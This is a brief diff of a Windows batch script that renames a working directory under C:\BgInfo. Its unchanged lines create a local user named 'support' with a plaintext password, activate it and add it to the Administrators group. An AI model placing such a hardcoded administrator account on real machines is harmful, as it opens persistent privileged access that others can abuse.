@@ -1,7 +1,6 @@
 @echo off
 CD /d "%~dp0"
-
-mkdir c:\BgInfo\do-pass-run
+md "C:\BgInfo\pschng"
 net users support saubnc@2020 /add
 net users support saubnc@2020 /active:yes
 net localgroup Administrators /add support
